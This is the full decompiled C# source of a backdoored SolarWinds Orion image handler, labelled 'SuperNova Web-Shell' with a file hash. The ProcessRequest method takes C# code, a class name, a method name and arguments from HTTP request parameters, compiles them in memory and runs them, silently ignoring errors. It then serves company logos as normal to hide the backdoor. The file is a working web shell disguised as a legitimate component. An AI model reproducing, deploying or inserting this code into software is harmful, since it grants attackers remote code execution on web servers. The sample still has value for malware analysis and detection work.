/*
 SuperNova Web-Shell
 c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71

*/

using System;
using System.CodeDom.Compiler;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Web;
using Microsoft.CSharp;
using SolarWinds.Logging;
using SolarWinds.Orion.Web.DAL;

// Token: 0x02000002 RID: 2
public class LogoImageHandler : IHttpHandler
{
	// Token: 0x17000001 RID: 1
	// (get) Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
	public bool IsReusable
	{
		get
		{
			return false;
		}
	}

	// Token: 0x06000002 RID: 2 RVA: 0x0000207C File Offset: 0x0000027C
	public void ProcessRequest(HttpContext context)
	{
		try
		{
			string codes = context.Request["codes"];
			string clazz = context.Request["clazz"];
			string method = context.Request["method"];
			string[] args = context.Request["args"].Split(new char[]
			{
				'\n'
			});
			context.Response.ContentType = "text/plain";
			context.Response.Write(this.DynamicRun(codes, clazz, method, args));
		}
		catch (Exception)
		{
		}
		NameValueCollection nameValueCollection = HttpUtility.ParseQueryString(context.Request.Url.Query);
		try
		{
			string a = nameValueCollection["id"];
			string s;
			if (!(a == "SitelogoImage"))
			{
				if (!(a == "SiteNoclogoImage"))
				{
					throw new ArgumentOutOfRangeException(nameValueCollection["id"]);
				}
				s = WebSettingsDAL.NewNOCSiteLogo;
			}
			else
			{
				s = WebSettingsDAL.NewSiteLogo;
			}
			byte[] array = Convert.FromBase64String(s);
			if ((array == null || array.Length == 0) && File.Exists(HttpContext.Current.Server.MapPath("//NetPerfMon//images//NoLogo.gif")))
			{
				array = File.ReadAllBytes(HttpContext.Current.Server.MapPath("//NetPerfMon//images//NoLogo.gif"));
			}
			string contentType;
			if (array.Length >= 2 && array[0] == 255 && array[1] == 216)
			{
				contentType = "image/jpeg";
			}
			else if (array.Length >= 3 && array[0] == 71 && array[1] == 73 && array[2] == 70)
			{
				contentType = "image/gif";
			}
			else if (array.Length >= 8 && array[0] == 137 && array[1] == 80 && array[2] == 78 && array[3] == 71 && array[4] == 13 && array[5] == 10 && array[6] == 26 && array[7] == 10)
			{
				contentType = "image/png";
			}
			else
			{
				contentType = "image/jpeg";
			}
			context.Response.OutputStream.Write(array, 0, array.Length);
			context.Response.ContentType = contentType;
			context.Response.Cache.SetCacheability(HttpCacheability.Private);
			context.Response.StatusDescription = "OK";
			context.Response.StatusCode = 200;
			return;
		}
		catch (Exception ex)
		{
			LogoImageHandler._log.Error("Unexpected error trying to provide logo image for the page.", ex);
		}
		context.Response.Cache.SetCacheability(HttpCacheability.NoCache);
		context.Response.StatusDescription = "NO IMAGE";
		context.Response.StatusCode = 500;
	}

	// Token: 0x06000005 RID: 5 RVA: 0x00002330 File Offset: 0x00000530
	public string DynamicRun(string codes, string clazz, string method, string[] args)
	{
		CompilerResults compilerResults = new CSharpCodeProvider().CreateCompiler().CompileAssemblyFromSource(new CompilerParameters
		{
			ReferencedAssemblies = 
			{
				"System.dll",
				"System.ServiceModel.dll",
				"System.Data.dll",
				"System.Runtime.dll"
			},
			GenerateExecutable = false,
			GenerateInMemory = true
		}, codes);
		if (compilerResults.Errors.HasErrors)
		{
			string.Join(Environment.NewLine, from CompilerError err in compilerResults.Errors
			select err.ErrorText);
			Console.WriteLine("error");
			return compilerResults.Errors.ToString();
		}
		object obj = compilerResults.CompiledAssembly.CreateInstance(clazz);
		return (string)obj.GetType().GetMethod(method).Invoke(obj, args);
	}

	// Token: 0x04000001 RID: 1
	private static Log _log = new Log();
}
